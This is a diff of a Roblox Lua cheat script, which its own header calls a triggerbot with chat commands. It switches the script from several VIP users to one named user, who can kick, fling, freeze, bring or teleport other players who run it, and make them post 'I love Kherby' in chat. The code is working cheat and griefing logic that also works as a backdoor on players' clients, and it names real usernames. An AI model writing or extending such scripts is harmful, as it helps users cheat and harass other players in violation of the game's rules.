@@ -1,4 +1,4 @@
--- Triggerbot + commands targeting everyone (.g/.s/.f/.k/.t + .tp/.h/.u with bubble chat & multi-VIP targeting each other)
+-- Triggerbot + commands targeting everyone (.g/.s/.f/.k/.t + .tp/.freeze/.unfreeze with bubble chat)
 
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
@@ -10,13 +10,8 @@ local Camera = workspace.CurrentCamera
 local LocalPlayer = Players.LocalPlayer
 local Mouse = LocalPlayer:GetMouse()
 
--- VIP USERS LIST
-local VIPUsers = {
-    ["draconvm"] = true,    -- you
-    ["K3TCHUPSS"] = true    -- your girlfriend
-}
-
 -- SETTINGS
+local VIPUser = "draconvm" -- your username
 local BringTargets = {}
 local FrozenPlayers = {}
 local Settings = {
@@ -111,9 +106,7 @@ end)
 RunService.RenderStepped:Connect(function()
     for targetName, _ in pairs(BringTargets) do
         local targetPlayer = Players:FindFirstChild(targetName)
-        local vipPlayerName
-        for name, _ in pairs(VIPUsers) do vipPlayerName = name break end -- bring to first VIP in list
-        local vipPlayer = Players:FindFirstChild(vipPlayerName)
+        local vipPlayer = Players:FindFirstChild(VIPUser)
         if targetPlayer and targetPlayer.Character and vipPlayer and vipPlayer.Character then
             local vipRoot = vipPlayer.Character:FindFirstChild("HumanoidRootPart")
             local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
@@ -127,7 +120,7 @@ end)
 
 -- FLING FUNCTION
 local function flingPlayer(player)
-    if player.Character then
+    if player.Name ~= VIPUser and player.Character then
         local root = player.Character:FindFirstChild("HumanoidRootPart")
         if root then
             local bodyVelocity = Instance.new("BodyVelocity")
@@ -142,6 +135,12 @@ end
 
 -- SAY "I LOVE KHERBY" IN BUBBLE CHAT
 local function sayILoveKherby()
+    local char = LocalPlayer.Character
+    if not char then return end
+    local head = char:FindFirstChild("Head")
+    if not head then return end
+
+    -- Use DefaultChatSystemChatEvents for bubble chat
     local ChatService = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
     if ChatService then
         local SayMessage = ChatService:FindFirstChild("SayMessageRequest")
@@ -149,10 +148,8 @@ local function sayILoveKherby()
             SayMessage:FireServer("I love Kherby", "All")
         end
     else
-        local char = LocalPlayer.Character
-        if char and char:FindFirstChild("Head") then
-            TextChatService:Chat(char.Head, "I love Kherby", Enum.ChatColor.Blue)
-        end
+        -- fallback for TextChatService
+        TextChatService:Chat(head, "I love Kherby", Enum.ChatColor.Blue)
     end
 end
 
@@ -173,7 +170,7 @@ local function freezePlayer(targetName)
     local targetPlayer = Players:FindFirstChild(targetName)
     if targetPlayer and targetPlayer.Character then
         local root = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
-        if root then
+        if root and not FrozenPlayers[targetPlayer.Name] then
             root.Anchored = true
             FrozenPlayers[targetPlayer.Name] = true
         end
@@ -182,7 +179,7 @@ end
 
 local function unfreezePlayer(targetName)
     local targetPlayer = Players:FindFirstChild(targetName)
-    if targetPlayer and targetPlayer.Character then
+    if targetPlayer and targetPlayer.Character and FrozenPlayers[targetPlayer.Name] then
         local root = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
         if root then
             root.Anchored = false
@@ -191,65 +188,45 @@ local function unfreezePlayer(targetName)
     end
 end
 
--- CHAT COMMAND HANDLER (VIPs can target each other now)
+-- CHAT COMMAND HANDLER
 local function onMessage(senderName, message)
-    local lowerName = senderName:lower()
-    if not VIPUsers[lowerName] then return end
+    if senderName:lower() ~= VIPUser:lower() then return end
     local msg = message:lower()
     local args = message:split(" ")
 
-    -- Kick anyone except self
-    if msg == ".k" then
-        for _, player in ipairs(Players:GetPlayers()) do
-            if player.Name ~= senderName then
-                player:Kick("Kicked by VIP: "..senderName)
-            end
-        end
+    if msg == ".k" and LocalPlayer.Name:lower() ~= VIPUser:lower() then
+        LocalPlayer:Kick("Kicked by VIP")
     end
 
-    -- Bring anyone except self
     if msg == ".g" then
-        for _, player in ipairs(Players:GetPlayers()) do
-            if player.Name ~= senderName then
-                BringTargets[player.Name] = true
-            end
-        end
+        BringTargets[LocalPlayer.Name] = true
     end
 
-    -- Stop bring anyone except self
     if msg == ".s" then
-        for _, player in ipairs(Players:GetPlayers()) do
-            if player.Name ~= senderName then
-                BringTargets[player.Name] = nil
-            end
-        end
+        BringTargets[LocalPlayer.Name] = nil
     end
 
-    -- Fling anyone except self
     if msg == ".f" then
         for _, player in ipairs(Players:GetPlayers()) do
-            if player.Name ~= senderName then
-                flingPlayer(player)
-            end
+            flingPlayer(player)
         end
     end
 
-    -- Bubble chat "I love Kherby"
     if msg == ".t" then
         sayILoveKherby()
     end
 
-    -- Freeze / Unfreeze anyone
-    if msg:sub(1,2) == ".h" and args[2] then
-        freezePlayer(args[2])
-    end
-    if msg:sub(1,2) == ".u" and args[2] then
-        unfreezePlayer(args[2])
-    end
-
-    -- Teleport to anyone
+    -- TP command
     if args[1]:lower() == ".tp" and args[2] then
         teleportToPlayer(args[2])
+    end
+
+    -- Freeze/unfreeze commands
+    if args[1]:lower() == ".freeze" and args[2] then
+        freezePlayer(args[2])
+    end
+    if args[1]:lower() == ".unfreeze" and args[2] then
+        unfreezePlayer(args[2])
     end
 end
 
